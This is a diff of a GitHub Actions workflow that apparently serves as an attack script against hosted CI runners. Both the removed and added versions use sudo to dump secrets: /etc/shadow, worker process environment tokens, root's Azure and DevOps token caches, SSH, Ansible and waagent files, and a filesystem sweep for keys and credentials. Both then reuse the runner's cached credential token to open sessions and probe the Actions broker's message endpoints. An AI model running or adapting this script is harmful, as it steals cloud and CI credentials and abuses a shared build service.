@@ -1,55 +1,57 @@
-name: SudoBroker
+name: RootAzure
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: sudo and broker deep
+      - name: root azure scan
         timeout-minutes: 5
         run: |
           set +e
-          echo === SUDO PRIVILEGES ===
-          sudo -l 2>&1
-          echo
-          echo === SHADOW FILE ===
-          sudo cat /etc/shadow 2>&1 | head -5
-          echo
-          echo === DIAGNOSTICS JSON ===
-          sudo cat /opt/hca/diagnostics.json 2>&1
-          echo
-          echo === RUNNER WORKER MEM VIA SUDO ===
-          WPID=$(pgrep -f Runner.Worker | head -1)
-          echo "Worker PID: $WPID"
-          sudo cat /proc/$WPID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|URL' | head -10
-          echo
-          echo === BROKER MESSAGE PATHS ===
+          echo === ROOT AZURE CONFIG ===
+          sudo find /root/.azure -type f 2>/dev/null | head -30
+          echo === AZURE PROFILE ===
+          sudo cat /root/.azure/azureProfile.json 2>/dev/null | head -30
+          echo === AZURE CLOUD CONFIG ===
+          sudo cat /root/.azure/clouds.config 2>/dev/null | head -20
+          echo === AZURE CONFIG ===
+          sudo cat /root/.azure/config 2>/dev/null | head -20
+          echo === AZURE TOKENS ===
+          sudo cat /root/.azure/accessTokens.json 2>/dev/null | head -20
+          sudo cat /root/.azure/msal_token_cache.json 2>/dev/null | head -20
+          echo === AZURE DEVOPS ===
+          sudo find /root/.azure-devops -type f 2>/dev/null | head -10
+          sudo cat /root/.azure-devops/.default 2>/dev/null
+          echo === ANSIBLE ===
+          sudo find /root/.ansible -type f 2>/dev/null | head -10
+          sudo cat /root/.ansible/ansible.cfg 2>/dev/null | head -10
+          echo === ROOT CONFIG ===
+          sudo find /root/.config -type f 2>/dev/null | head -20
+          echo === ROOT BASHRC ===
+          sudo cat /root/.bashrc 2>/dev/null | head -20
+          echo === ROOT DOTNET ===
+          sudo find /root/.dotnet -name '*.json' -type f 2>/dev/null | while read f; do
+            echo "--- $f ---"
+            sudo cat "$f" 2>/dev/null | head -10
+          done
+          echo === ALL ROOT SENSITIVE FILES ===
+          sudo find /root -name '*.json' -o -name '*.key' -o -name '*.pem' -o -name '*.token' -o -name '*secret*' -o -name '*credential*' -o -name '*password*' -o -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -30
+          echo === ROOT SSH ===
+          sudo ls -la /root/.ssh/ 2>/dev/null
+          echo === WAAGENT FULL ===
+          sudo find /var/lib/waagent -name '*.json' -o -name '*.xml' -o -name '*.cfg' 2>/dev/null | head -20
+          sudo cat /var/lib/waagent/waagent_status.json 2>/dev/null | head -10
+          echo === BROKER MESSAGE WITH STATUS ===
           CRED=$(cat /home/runner/actions-runner/cached/2.336.0/.credentials 2>/dev/null || cat /home/runner/actions-runner/cached/2.335.1/.credentials 2>/dev/null)
           TOKEN=$(echo $CRED | python3 -c 'import sys,json; print(json.loads(sys.stdin.read()).get("Data",{}).get("token",""))')
           BROKER=https://broker.actions.githubusercontent.com
-          echo "Token len: ${#TOKEN}"
           curl -s --max-time 5 -X DELETE -H "Authorization: Bearer $TOKEN" $BROKER/session > /dev/null 2>&1
-          SESSION=$(curl -s --max-time 5 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{}' $BROKER/session 2>&1)
-          echo "Session: $SESSION"
-          SID=$(echo $SESSION | python3 -c 'import sys,json; print(json.loads(sys.stdin.read()).get("sessionId",""))' 2>/dev/null)
-          echo "SessionID: $SID"
-          for ep in /message /_apis/v1/message "/_apis/v1/message?sessionId=$SID" /jobs /runners /pools /_apis/distributedtask/pools /_apis/connectionData "/_apis/v1/timer?sessionId=$SID" "/_apis/v1/connect?sessionId=$SID"; do
-            for method in GET POST; do
-              RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -X $method -H "Authorization: Bearer $TOKEN" "$BROKER$ep" 2>&1)
-              CODE=$(echo "$RESP" | tail -1)
-              BODY=$(echo "$RESP" | head -5 | head -c 300)
-              if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
-                echo "$method $ep: $CODE $BODY"
-              fi
-            done
+          curl -s --max-time 5 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{}' $BROKER/session > /dev/null 2>&1
+          for status in idle online busy active; do
+            RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -H "Authorization: Bearer $TOKEN" -H "X-Runner-Status: $status" "$BROKER/message" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -5 | head -c 300)
+            echo "message status=$status: $CODE $BODY"
           done
-          echo
-          echo === SUDO TESTS ===
-          sudo id 2>&1
-          sudo cat /root/.ssh/authorized_keys 2>/dev/null | head -3
-          sudo ls -la /root/ 2>/dev/null | head -10
-          echo
-          echo === NETWORK RULES ===
-          sudo iptables -L -n 2>&1 | head -20
-          echo
           echo === DONE ===
